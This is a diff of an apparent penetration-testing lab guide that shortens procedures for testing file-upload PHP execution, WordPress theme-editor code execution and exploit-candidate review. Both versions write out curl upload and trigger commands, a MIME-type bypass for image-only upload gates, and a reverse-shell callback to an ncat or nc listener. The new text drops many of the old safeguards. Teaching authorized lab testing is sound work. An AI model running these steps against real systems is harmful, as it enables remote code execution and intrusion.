-goes to private adventure evidence, then a separately authorized use at the changed-context check. Errors,
-contradictions, budget exhaustion, NULL/empty/non-ASCII or cardinality problems
-stay distinct at **PAUSE-COVERAGE/WEB-09/PAUSE-COVERAGE**. Recovered text is not an
-authenticated credential or OS access. Restore the ordinary control:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-numeric-id>' \
-  --output './sql-boolean-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-for name in nonnull length ascii threshold true false control; do
-  file="./sql-boolean-<same-run-id>/$name.body"
-  if test -f "$file"; then rm -- "$file"; fi
-done
-rmdir -- './sql-boolean-<same-run-id>'
-```
-
-Missing/retained files may make cleanup report errors. Inspect exact paths;
-never substitute recursive deletion or claim all copies vanished.
+| Length and characters confirm | Record the scalar; not a credential by itself. |
+| False at a step | **PAUSE-COVERAGE**. |
+| Channel unstable | **WEB-09**. |
 
 # web_upload
 
-Run in **Kali Bash** against one assigned, authorized lab application. Start from
-its ordinary upload request captured at WEB-08. Know the exact file field,
-required fields, current identity, published-file route and application delete
-action. Test only new unique files, never replace an existing application file.
-WUPLOAD-02 can be selected directly if that storage context is already verified.
-Other runtimes, download-only stores and uncertain cleanup need a different
-procedure. Require curl 8.4+ and Python 3 for the optional PHP artifact.
-
-Replace each field, URL and path directly. Choose a new private local directory
-name and repeat it in the selected task. Stop if creation fails or it exists.
-Repeat required non-secret multipart fields with `--form-string 'name=value'`;
-obtain fresh CSRF context through the normal UI. For the existing WEB-09 identity,
-add its private session header file only after manually checking the URL's scheme,
-hostname and port. No redirect or TLS bypass. Run requests individually; stop on
-curl errors, partial output, login, 429, wrong origin or instability. Status alone
-does not prove storage/execution/deletion. Keep files private; do not print session
-tokens or returned PHP source. Simple field/file names use letters/digits,
-underscores and hyphens; other characters need the captured-request editor.
+Test only new files. Keep the exact file field, required fields, record view and delete action.
 
 ## WUPLOAD-01. Where did one ordinary uploaded file land?
 
-Create one unique non-executable marker and submit the ordinary multipart request:
-
 ```bash
-mkdir -m 700 -- './upload-marker-<unique-run-id>'
+printf 'OWB_UPLOAD_<NONCE>\n' > marker.txt
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@marker.txt;filename=owb-<NONCE>.txt;type=text/plain' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o read.body '<FILE_URL>'
+cmp marker.txt read.body
 ```
 
-Use a fresh simple marker/filename and stop if it already exists:
-
-```bash
-( set -C; printf 'OWB_UPLOAD_<unique-nonce>\n' > './upload-marker-<same-run-id>/marker.txt' )
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --form '<file-field>=@./upload-marker-<same-run-id>/marker.txt;filename=owb-<unique-nonce>.txt;type=text/plain' \
-  --output './upload-marker-<same-run-id>/upload.body' --write-out 'HTTP %{http_code}\n' '<observed-upload-url>'
-```
-
-Inspect the normal UI/response for the assigned upload record and exact published
-URL. A redirect must be reviewed, not automatically followed. Enter the observed
-same-origin URL, including an application-assigned renamed path if present:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --output './upload-marker-<same-run-id>/read.body' --write-out 'HTTP %{http_code}\n' '<exact-observed-same-origin-marker-url>'
-```
-
-```bash
-cmp -- './upload-marker-<same-run-id>/marker.txt' './upload-marker-<same-run-id>/read.body'
-```
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| Exact marker bytes at the attributed file URL | Record field, record ID, server rename and read/delete routes. If PHP execution testing is justified and permitted, **WUPLOAD-02**. |
-| Accepted record but no attributable/readable file | **WEB-08**. Check normal download route, processing delay and storage identity, not invented directory traversal or extension permutations. |
-| File transformed, wrapped or served as a download | **WEB-08**. Record actual behavior; upload access does not imply a PHP handler. |
-| Login/403/CSRF/error/other-origin route | **WEB-09** or **WEB-01** for the exact missing request context. Do not retry with guessed credentials. |
+| Exact bytes at the file URL | **WUPLOAD-02** if PHP is justified. |
+| Record created, file unreadable | **WEB-08**. |
+| Served as download | **WEB-08**; no handler. |
+| Login or CSRF error | **WEB-09**. |
 
-When finished, use the normal application's delete action for this exact
-marker record. Refresh its record listing and request the former URL once:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --output './upload-marker-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-observed-marker-url>'
-```
-
-A login page, generic 200 or stale cache is not absence proof. Unresolved orphan
-to **PAUSE-RECOVERY**. After confirmed record/file absence and private custody:
-
-```bash
-rm -i -- './upload-marker-<same-run-id>/marker.txt' './upload-marker-<same-run-id>/upload.body' './upload-marker-<same-run-id>/read.body' './upload-marker-<same-run-id>/verify.body'
-rmdir -- './upload-marker-<same-run-id>'
-```
-
-Do not leave the marker behind because a PHP test will follow.
+Delete through the app and re-request the URL. 404 alone is not proof.
 
 ## WUPLOAD-02. Does an uploaded PHP file execute, and can it open one lab shell?
 
-Enter only for an observed Linux/PHP application whose exact upload storage and
-delete route are known. This changes the target by adding one executable file
-and may occupy a web worker while the callback shell is open. Explicitly choose
-the attempt on the disposable authorized lab. Choose the ordinary PHP upload
-or the one observed multipart filename/MIME gate below, not an extension sweep.
-Use PHP 7.4+; missing process/socket functions, no PHP handler, Windows,
-or unknown worker restrictions keep their own gap. Do not silently change them.
-
-Set the actual Kali lab-interface IPv4 and an unused listener port. Generate a
-unique short-lived file with a private action token. It supports only identity
-proof, a fixed Bash callback and self-removal, not an HTTP command parameter:
+Generate the reviewed proof file (identity, fixed callback, self-remove) with the [local artifact generator](../../../scripts/make-lab-upload-proof.py):
 
 ```bash
-mkdir -m 700 -- './upload-php-<unique-run-id>'
+python3 '<make-lab-upload-proof.py>' './upload-php' '<KALI_IP>' '<PORT>'
+cat './upload-php/name.txt'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@./upload-php/proof.php;filename=<NAME>;type=application/octet-stream' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@./upload-php/action.headers' --data-urlencode 'mode=proof' -o proof.body -w 'HTTP %{http_code}\n' '<FILE_URL>'
 ```
 
-Copy the standalone [local artifact generator](../../../scripts/make-lab-upload-proof.py)
-from the host repository to Kali using your normal file transfer. The file needs
-only Python 3, not Workbench or its dependencies. Review its source once. It
-creates proof.php, name.txt and action.headers locally; it never contacts the
-target, starts a listener or runs PHP. Stop if any named artifact already exists.
-Replace the script path, owned interface IPv4 and unused unprivileged port:
+For an image-only filename gate, send the same bytes with `type=image/jpeg`.
 
-```bash
-python3 '<local-path-to-make-lab-upload-proof.py>' './upload-php-<same-run-id>' '<owned-Kali-lab-interface-ipv4>' '<unused-listener-port>'
-```
-
-```bash
-cat -- './upload-php-<same-run-id>/name.txt'
-sha256sum -- './upload-php-<same-run-id>/proof.php'
-```
-
-Stop if generation fails. If PHP is locally installed, syntax-check only with
-`php -n -l './upload-php-<same-run-id>/proof.php'`; do not run it on Kali. Copy the
-printed name into the upload's filename below. Choose **one** upload request
-matching the observed application, with fresh required fields/CSRF. Do not send
-both variants with the same file/name or automatically retry a rejected upload.
-
-For ordinary PHP-file storage that already permits this request:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --form '<file-field>=@./upload-php-<same-run-id>/proof.php;filename=<printed-generated-name>;type=application/octet-stream' \
-  --output './upload-php-<same-run-id>/upload.body' --write-out 'HTTP %{http_code}\n' '<observed-upload-url>'
-```
-
-For the observed image-upload request where the browser's filename restriction
-or declared multipart type is the relevant gate, keep its actual file field,
-required fields and session. Use the generated unique `.php` name as the **wire
-filename**, and the exact captured image-part MIME type, such as `image/jpeg`:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --form '<file-field>=@./upload-php-<same-run-id>/proof.php;filename=<printed-generated-name>;type=<captured-image-part-MIME-type>' \
-  --output './upload-php-<same-run-id>/upload.body' --write-out 'HTTP %{http_code}\n' '<observed-upload-url>'
-```
-
-The local file remains `proof.php`; no disguised local copy is needed. Curl
-sets the multipart filename independently of that local basename. This sends
-PHP bytes with a declared image type, **not a valid image**. Server-side image
-decoding, content scanning, extension rejection or rewriting may refuse it.
-On refusal, preserve the actual response and any created record, clean it through
-the known UI, then **WEB-08/PAUSE-COVERAGE**. Do not add magic bytes, change the handler,
-or spray extension variants as if this observation authorized them.
-
-Record the exact new upload record and observed published URL. Do not construct
-it solely from the client filename. Then request one proof action:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --header '@./upload-php-<same-run-id>/action.headers' --data-urlencode 'mode=proof' \
-  --output './upload-php-<same-run-id>/proof.body' --write-out 'HTTP %{http_code}\n' '<exact-observed-same-origin-new-file-url>'
-```
-
-```bash
-grep -q '<?php' './upload-php-<same-run-id>/proof.body' && printf 'Returned PHP source; stop and delete via UI.\n'
-```
-
-Inspect proof only after ruling out returned source. Require `executed` with the
-generated name, the attributed host, actual `id` output and `id exit 0` together.
-Do not interpret PHP's owner ID or an HTTP 200 as OS command execution.
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| Matching execution marker, host and `id` | Record PHP/OS execution as that web-worker identity. Choose cleanup now, or the explicitly selected callback below. Root still needs host/namespace and objective checks. |
-| Literal source/download, rewritten file or no marker | **WEB-08**. Delete the exact upload through the UI; do not disclose the token or spray bypasses. |
-| Filename/MIME variant rejected, normalized or stored under a nonexecuting handler | Keep its actual record/path and response. **WEB-08/PAUSE-COVERAGE**, then delete any exact created object. Client acceptance is not a server-validation result. |
-| Process prerequisite missing or `id` fails | PHP may execute, but this OS-execution method is unproven. **PAUSE-COVERAGE**, then exact cleanup. |
-| Wrong host/identity, login or uncertain record | **EXP-03** or **WEB-09**; no callback until attribution/context is resolved. |
+| `executed` with host, `id` and exit 0 | Choose cleanup or the callback. |
+| PHP source returned | **WEB-08**; delete the upload. |
+| Rejected filename or MIME | **WEB-08** / **PAUSE-COVERAGE**. |
+| Missing process function | **PAUSE-COVERAGE**. |
 
-For the callback, open **another Kali terminal**, use the same owned IPv4/port,
-confirm the address is on the intended lab interface with `ip -brief address`,
-then run this single-connection foreground listener:
-
-```bash
-ncat --listen '<same-owned-Kali-lab-interface-ipv4>' '<same-unused-listener-port>' --verbose
-```
-
-It is plain TCP, not TLS or authenticated Ncat. Keep it on the authorized lab
-interface, not `0.0.0.0`; correlate the reported peer and host proof. No `--keep-open`
-or automatic listener command. Back in the request terminal, trigger once:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --header '@./upload-php-<same-run-id>/action.headers' --data-urlencode 'mode=callback' \
-  --output './upload-php-<same-run-id>/callback.body' --write-out 'HTTP %{http_code}\n' '<same-observed-new-file-url>'
-```
-
-In the connected listener terminal, type these commands **on the target shell**:
-
-```bash
-hostname
-id
-pwd
-```
-
-If the identity appears privileged but a container or user namespace is
-suspected, inspect `cat /proc/self/uid_map` before interpreting host authority.
-
-Matching target/identity and usable commands go to **EXP-03**, then **LNX-01**.
-The socket shell has no PTY; job-control warnings are expected, not proof of a
-failed command. No connection goes to **PAUSE-COVERAGE** for the single route/listener/
-worker prerequisite. A stray peer or wrong host goes to **PAUSE-ROUTE**. The curl
-request can remain waiting while the shell survives. Interrupting curl is
-not cancellation: verify the listener, do not retrigger or start another shell.
-
-When finished, type `exit` in the target shell and confirm the foreground
-listener connection ends. If still waiting without a connection, interrupt that
-exact listener with Ctrl-C. Use the application's delete action on the exact PHP
-record, or, if the executing file remains reachable and the worker can accept a
-new request, use its token-bound self-removal action:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --header '@./upload-php-<same-run-id>/action.headers' --data-urlencode 'mode=cleanup' \
-  --output './upload-php-<same-run-id>/cleanup.body' --write-out 'HTTP %{http_code}\n' '<same-observed-new-file-url>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --output './upload-php-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-observed-new-file-url>'
-```
-
-Self-removal must name this unique file. Also remove any retained upload record
-through its ordinary UI. Confirm the new record and executable are absent, no
-callback connection/owned listener remains, and no duplicate/staged upload was
-created. A 404 alone does not prove backing-file absence; use the record/storage
-view or, from independently verified access, exact path metadata. Worker hang,
-inaccessible orphan, uncertain deletion or residual child means **PAUSE-RECOVERY**
-and disposable-lab recovery, not repeat triggering. Only after remote cleanup
-and privately retaining needed non-secret evidence, remove the exact local files:
-
-```bash
-rm -i -- './upload-php-<same-run-id>/proof.php' './upload-php-<same-run-id>/name.txt' './upload-php-<same-run-id>/action.headers' './upload-php-<same-run-id>/upload.body' './upload-php-<same-run-id>/proof.body' './upload-php-<same-run-id>/callback.body' './upload-php-<same-run-id>/cleanup.body' './upload-php-<same-run-id>/verify.body'
-rmdir -- './upload-php-<same-run-id>'
-```
-
-Missing/retained files can make cleanup fail. Inspect exact paths, never use
-recursive deletion or discard the recovery material before confirmed cleanup.
+Callback: `ncat --listen '<KALI_IP>' '<PORT>' --verbose`, then request `mode=callback`. In the shell: `hostname; id; pwd`. Verify with **EXP-03**, then **LNX-01**. Cleanup with `mode=cleanup` or the UI, then delete the exact local files.
 
 # web_editor
 
 ## WEDIT-01. Does this authorized existing template execute PHP, then restore cleanly?
 
-**Use when:** WEB-09 verifies the assigned WordPress identity and its actual
-theme-file editor permits one selected PHP template. WEB-03/10 establishes the
-Linux/PHP 7.4+ handler and exact same-origin request expected to reach it.
-Choose a peripheral template such as the observed 404 template, not `functions.php`,
-configuration, authentication or a global include. A stylesheet is not a PHP
-handler. Record theme, relative file, selected editor GET URL and trigger URL.
+Enter with an evidenced Linux/PHP app, a verified editor session and one peripheral template. Record theme, file, editor URL and trigger URL. Keep a tested reset path.
 
-Require explicit existing-file modification permission on a quiet disposable
-lab, no concurrent edits, and tested out-of-band file/VM/reset recovery before
-saving anything. Keep the editor and original session available. The original
-must be complete UTF-8/LF text within 65536 bytes. If copying/round-tripping that
-source cannot be established, stop at PAUSE-COVERAGE. Account access is not permission
-to enable a disabled editor, change file permissions or activate another theme.
-
-1. On **Kali**, create a new private directory. Use the existing WEB-09 private
-   session-header file only for its checked scheme/host/port. Do not follow
-   redirects or bypass TLS. Capture the exact selected editor GET, not a login
-   page or another theme's file. Curl 8.4+ and Python 3 are required.
+Capture the original and prove the ordinary trigger before editing:
 
 ```bash
-mkdir -m 0700 -- './editor-proof-<run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@<HEADERS>' -o before.html '<EDITOR_URL>'
+python3 '<copy-lab-editor-source.py>' before.html original.php '<THEME>' '<FILE>'
+sha256sum original.php
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o baseline.body '<TRIGGER_URL>'
 ```
+
+Generate a proof with self-delete off, paste it into the editor, save once, re-read the editor and compare:
 
 ```bash
-test ! -e './editor-proof-<same-run-id>/before.html' && test ! -L './editor-proof-<same-run-id>/before.html' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --header '@<private-current-session-header-file>' --output './editor-proof-<same-run-id>/before.html' --write-out 'HTTP %{http_code}\n' '<exact-selected-editor-get-url>'
+python3 '<make-lab-upload-proof.py>' './editor-proof' '<KALI_IP>' '<PORT>' --existing-file
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@<HEADERS>' -o edited.html '<EDITOR_URL>'
+python3 '<copy-lab-editor-source.py>' edited.html edited.php '<THEME>' '<FILE>'
+cmp proof.php edited.php
 ```
 
-   Continue only after a complete successful response with the correct identity,
-   selected theme/file and current source field. The local helper checks the
-   single WordPress form/field and matching hidden theme/file, then creates an
-   absent private copy. It never requests, saves or executes target code.
+Send one proof request:
 
 ```bash
-python3 '<local-path-to-copy-lab-editor-source.py>' './editor-proof-<same-run-id>/before.html' './editor-proof-<same-run-id>/original.php' '<observed-theme-slug>' '<observed-relative-template-file>'
-sha256sum -- './editor-proof-<same-run-id>/original.php'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@./editor-proof/action.headers' --data 'mode=proof' -o proof.body '<TRIGGER_URL>'
 ```
 
-   Record the reported source hash independently. This is editor-source custody,
-   not a filesystem inode/ownership backup. Keep the tested fallback. Open the
-   local original privately and confirm complete LF-only source, exact theme/file
-   attribution and no missing section. Do not print source or session tokens to
-   shared terminal logs. On the same authorized trigger URL, record ordinary
-   behavior before the edit:
-
-```bash
-test ! -e './editor-proof-<same-run-id>/baseline.body' && test ! -L './editor-proof-<same-run-id>/baseline.body' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --output './editor-proof-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-same-origin-template-trigger-url>'
-```
-
-2. Generate a fresh proof with **self-deletion disabled**. Choose an owned Kali
-   IPv4 and an unused unprivileged callback port even if only using proof mode.
-   Use the reviewed helper, not an inline web shell or the upload-only default.
-
-```bash
-python3 '<local-path-to-make-lab-upload-proof.py>' './editor-proof-<same-run-id>' '<owned-Kali-IPv4>' '<chosen-unused-listener-port>' --existing-file
-sha256sum -- './editor-proof-<same-run-id>/proof.php'
-```
-
-   In the existing WordPress editor, confirm the same theme/file again. Open the
-   local generated `proof.php` in a private text editor, replace that selected
-   field's full content, and choose **Update File once** using its current UI/CSRF
-   context. Do not edit `style.css`, switch themes, add a new file or disable
-   loopback/fatal-error checks. A save message is not execution proof.
-   Reread the selected editor GET into a new `edited.html`. Stop on a failed or
-   incomplete capture. Then independently extract and compare:
-
-```bash
-test ! -e './editor-proof-<same-run-id>/edited.html' && test ! -L './editor-proof-<same-run-id>/edited.html' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --header '@<private-current-session-header-file>' --output './editor-proof-<same-run-id>/edited.html' --write-out 'HTTP %{http_code}\n' '<exact-selected-editor-get-url>'
-```
-
-```bash
-python3 '<local-path-to-copy-lab-editor-source.py>' './editor-proof-<same-run-id>/edited.html' './editor-proof-<same-run-id>/edited.php' '<observed-theme-slug>' '<observed-relative-template-file>' && cmp -- './editor-proof-<same-run-id>/proof.php' './editor-proof-<same-run-id>/edited.php'
-```
-
-   A mismatch, rejected save, incomplete response or automatic revert stops the
-   proof attempt and still requires restoration/verification. Do not repeatedly
-   save or defeat the editor's safeguards.
-
-3. If the exact generated source persisted, send **one** fixed native-identity
-   proof to the observed trigger URL. The action token remains in a private
-   header file. Add the current private session header only if this actual trigger
-   requires that identity, after checking its same origin. No arbitrary command
-   parameter or path guessing is supplied.
-
-```bash
-test ! -e './editor-proof-<same-run-id>/proof.body' && test ! -L './editor-proof-<same-run-id>/proof.body' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --header '@./editor-proof-<same-run-id>/action.headers' --data 'mode=proof' --output './editor-proof-<same-run-id>/proof.body' --write-out 'HTTP %{http_code}\n' '<observed-same-origin-template-trigger-url>'
-```
+Restore before closing: paste `original.php` back, save once, re-read, compare with `original.php`, and confirm the ordinary page returns.
 
 | Result | Next |
 | --- | --- |
-| Generated run marker, assigned host and native numeric `id` with exit zero | Record only this verified PHP process identity. If interactive access is needed, use the optional callback below; otherwise restore now. This is not CMS-admin-to-root proof. |
-| Raw PHP, unchanged page, 403/token denial, missing runtime/function, timeout or ambiguous output | No execution claim. Restore and verify below, then PAUSE-COVERAGE for the specific trigger/handler gap. Do not weaken the token or try unrelated template paths. |
-
-   Optional callback after that proof: on Kali, start one listener in a separate
-   foreground terminal, then send one request from the original Kali terminal:
-
-```bash
-nc -lvnp '<same-chosen-unused-listener-port>'
-```
-
-```bash
-test ! -e './editor-proof-<same-run-id>/callback.body' && test ! -L './editor-proof-<same-run-id>/callback.body' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --header '@./editor-proof-<same-run-id>/action.headers' --data 'mode=callback' --output './editor-proof-<same-run-id>/callback.body' --write-out 'HTTP %{http_code}\n' '<observed-same-origin-template-trigger-url>'
-```
-
-   A connected peer is not a shell; use
-   EXP-03's native host/identity block in the promised Bash channel. A timeout can
-   coexist with a live callback. Exit the owned child shell and stop the exact
-   listener before restoration, even if proof or connection failed. Confirm no
-   owned listener remains with `ss -ltn 'sport = :<same-listener-port>'`.
-
-4. **Restore before closing the editor**, including after a failed attempt.
-   Check the recorded original hash on the local backup. Open it privately and
-   replace only the same theme/file's source field with that full original.
-   Choose Update File once with a fresh normal UI/CSRF context. Do not invoke
-   the proof's cleanup mode, unlink the file, delete the theme or erase logs.
-
-```bash
-printf '%s  %s\n' '<independently-recorded-original-source-SHA256>' './editor-proof-<same-run-id>/original.php' | sha256sum -c -
-```
-
-   Reread the exact editor GET into a fresh `restored.html`. Stop on a failed
-   capture, then extract/compare
-   against the preserved original, not the generated proof:
-
-```bash
-test ! -e './editor-proof-<same-run-id>/restored.html' && test ! -L './editor-proof-<same-run-id>/restored.html' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --header '@<private-current-session-header-file>' --output './editor-proof-<same-run-id>/restored.html' --write-out 'HTTP %{http_code}\n' '<exact-selected-editor-get-url>'
-```
-
-```bash
-python3 '<local-path-to-copy-lab-editor-source.py>' './editor-proof-<same-run-id>/restored.html' './editor-proof-<same-run-id>/restored.php' '<observed-theme-slug>' '<observed-relative-template-file>' && cmp -- './editor-proof-<same-run-id>/original.php' './editor-proof-<same-run-id>/restored.php'
-```
-
-   Repeat the ordinary baseline GET with a fresh `after.body`:
-
-```bash
-test ! -e './editor-proof-<same-run-id>/after.body' && test ! -L './editor-proof-<same-run-id>/after.body' && curl --disable --globoff --proto '=http,https' --noproxy '*' -sS --connect-timeout 5 --max-filesize 1048576 --output './editor-proof-<same-run-id>/after.body' --write-out 'HTTP %{http_code}\n' '<observed-same-origin-template-trigger-url>'
-```
-
-   Confirm its actual
-   expected page/function returns and the proof marker no longer appears. Matching
-   status alone is insufficient. Editor-source equality plus normal behavior is
-   editor-level restoration, not proof of filesystem metadata or unrelated pages.
-   If a target shell is available, separately compare the attributed file's
-   recorded bytes/metadata; do not invent a pre-change inode/hash observation.
-
-| Cleanup result | Next |
-| --- | --- |
-| Original editor source matches, ordinary behavior resumes, owned callback/listener gone | the source step's cleanup records the restoration actually observed. EXP-03/LNX-01 handles any separately retained verified access, or PAUSE-COVERAGE chooses another lead. |
-| Restore rejected, mismatch, stale proof response, changed file/context, broken page or uncertain child process | PAUSE-RECOVERY with the preselected out-of-band route. Keep all backups; do not close out, overwrite someone else's change or use self-deletion as rollback. |
-
-   Retain the original/response evidence privately if needed.
-   After confirmed restoration and a retention decision, remove **only this
-   run's exact local files**, including an attributed partial capture. Unexpected
-   files cause `rmdir` to refuse; never remove the target template or original
-   credentials. A failed recovery keeps all copies.
-
-```bash
-ls -la -- './editor-proof-<same-run-id>'
-rm -i -- './editor-proof-<same-run-id>/before.html' './editor-proof-<same-run-id>/original.php' './editor-proof-<same-run-id>/baseline.body' './editor-proof-<same-run-id>/proof.php' './editor-proof-<same-run-id>/name.txt' './editor-proof-<same-run-id>/action.headers' './editor-proof-<same-run-id>/edited.html' './editor-proof-<same-run-id>/edited.php' './editor-proof-<same-run-id>/proof.body' './editor-proof-<same-run-id>/callback.body' './editor-proof-<same-run-id>/restored.html' './editor-proof-<same-run-id>/restored.php' './editor-proof-<same-run-id>/after.body'
-rmdir -- './editor-proof-<same-run-id>'
-test ! -e './editor-proof-<same-run-id>' && test ! -L './editor-proof-<same-run-id>' && printf 'Local proof directory absent\n'
-```
+| Marker, assigned host and real `id` | **EXP-03**, then **LNX-01** if a shell is needed. |
+| Raw PHP or unchanged page | **PAUSE-COVERAGE** after restore. |
+| Save rejected or source mismatch | **PAUSE-RECOVERY**. |
+| Restore mismatch or broken page | **PAUSE-RECOVERY** with the out-of-band route. |
 
 # access
 
 ## EXP-01. Does one candidate fit the observed endpoint and context?
 
-**Select command** for one observed local candidate in the current service
-context. **Review result** compares its exact identity and compatibility facts.
-**Confirm result** retains the reviewed decision; selection and review do not
-progress the Quest. A selected title or version is not proof that the target is
-vulnerable. An already open attributable session goes to **EXP-03**; supplied SSH
-credentials use **SSH-01**.
+Compare the candidate with the exact product/version, the function you reached, OS and process architecture, required configuration or input, callback route, payload constraints, and recovery. A title or banner match is not applicability.
 
-The guide supports a service-only context. An application base is required only
-when the selected recipe needs an application URL. It records the exact path
-report and source-review Terminal receipts automatically. Hash, file type and
-source custody are retained as audit provenance rather than separate operator
-chores. An exact EDB identity without a CVE remains reviewable. The primary
-decision asks only for the compatibility facts required by the selected
-candidate:
-
-| Required fact                                          | Compare with the candidate                                                                                               |
-| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------ |
-| Exact product/build and observed function              | A banner match alone is insufficient. Does the candidate exercise the endpoint you actually reached?                     |
-| Target OS and process architecture                     | Host CPU width does not establish vulnerable process width.                                                              |
-| Required authentication/configuration/input path       | Is each condition actually present, denied or still unknown?                                                             |
-| Callback/bind address, port and route, if required     | Use your lab-facing endpoint, not an assumed NAT/host address.                                                           |
-| Payload format, offsets/tags/bad-character constraints | Keep the source's relationships intact; do not replace only one matching string blindly.                                 |
-| Changes and recovery                                   | Which target files/processes/settings can change, and what exact restoration or disposable-lab reset is available?       |
-| Execution interface                                    | Obtain the exact interpreter, arguments, observation point and documented stop condition from reviewed source/procedure. |
-
-Callback routing appears only when the selected candidate requires a callback.
-Working-copy, copy and diff controls appear only when an explicit recipe or
-manual review requires an edit. Unsupported candidates reach a named honest stop
-with the missing procedure or compatibility fact; they do not loop on source
-review or borrow another candidate's recipe.
-
-Reviewed profiles may use an exact local source interface or a backend-owned
-managed Metasploit resource. The managed path accepts only its fixed module and
-typed options, retains a new immutable hashed `.rc` artifact, materializes it at
-a verified private companion path, and binds it to the exact candidate, Quest,
-service and companion identity. The generated resource cannot be substituted
-across profiles or edited in place.
-
-| Result                                                                                                                              | Next action                                                                                                                       |
-| ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
-| All required facts supported and exact procedure reviewed                                                                           | **EXP-02**, with automatic source custody and recovery context retained.                                                          |
-| `no_matching_local_candidate_other_service_available` — Complete local search reported no matching exploit candidate                | **NET-05**, select another observed service. The named no-result receipt does not prove corpus completeness or target safety.     |
-| `no_matching_local_candidate_no_other_service` — Complete local search reported no matching exploit candidate                       | **PAUSE-COVERAGE**, preserve the exact query and resume when new evidence or local catalogue coverage changes.                    |
-| Build/configuration/input prerequisite missing                                                                                      | **NET-05**, select another supported lead; do not treat a title match as applicability.                                           |
-| One fact unknown                                                                                                                    | Use the existing service/host decision that answers it, such as **NET-03**, **WEB-03** or **LNX-01**. Keep the candidate pending. |
-| `unreviewed_binary_opaque_startup_behavior_or_no_recovery` — Unsupported artifact/procedure, opaque startup behavior or no recovery | **GAP-ACCESS** as a named honest stop with the specific missing prerequisite; do not run it just to see.                          |
-| Route/host context conflicts                                                                                                        | **PAUSE-ROUTE**, correct the lab connection first.                                                                                |
-
-Confirming the reviewed result atomically retains the candidate and its authored
-EXP-01 outcome. Only the supported, exact-procedure outcome opens **EXP-02**;
-negative or unsupported outcomes retain the review and follow their authored
-route without execution authority.
+| Result | Next |
+| --- | --- |
+| All facts supported and the procedure reviewed | **EXP-02**. |
+| No local candidate, other service available | **NET-05**. |
+| No candidate, no other service | **PAUSE-COVERAGE**. |
+| One prerequisite missing | Answer it at **NET-03**, **WEB-03** or **LNX-01**. |
+| Unsupported artifact or no recovery | **GAP-ACCESS**. |
+| Route conflict | **PAUSE-ROUTE**. |
 
 ## EXP-02. What did one reviewed attempt actually produce?
 
-**Select command** from EXP-01's exact candidate-specific preparation; there is no
-universal exploit CLI or generic executable placeholder. Ordinary source profiles
-may stage under the current Quest context without pressing Enter. For
-managed-resource profiles, the verified managed executor is the sole execution path and
-no duplicate Terminal command is armed. Separate named reviews and confirmations
-govern resource materialization, one-use execution, retained result review,
-uncertain process stop, and exact cleanup. **Review result** keeps the complete
-bounded raw attempt output beside its parsed classification. **Confirm result**
-records only the selected observation; proof, callback/channel confirmation and
-EXP-03 attribution remain separate later decisions.
+Start the reviewed listener or observation point, run the one attempt, and keep the raw output. Tool text such as `sent` is not execution.
 
-Start only the procedure's reviewed listener or observation point, if required.
-Do not invent a listener protocol or payload when the candidate lacks one. The
-active guide supplies the retained recipe's structured arguments, time limit and
-stop condition. A local process exit or retained response custody does not prove
-target-side execution, cleanup, a channel or success. Do not repeat automatically.
-The managed executor commits one-use authority before dispatch, uses structured
-arguments with `shell=False`, and authenticates the companion, resource path,
-digest, process identity and protected output again on every read. A lost launch
-receipt never redispatches. Process-group stop reconciliation must prove the exact process group is
-absent before cleanup; ambiguous or tampered process state remains at
-**PAUSE-RECOVERY**. Resource cleanup is separately confirmed. This lifecycle never
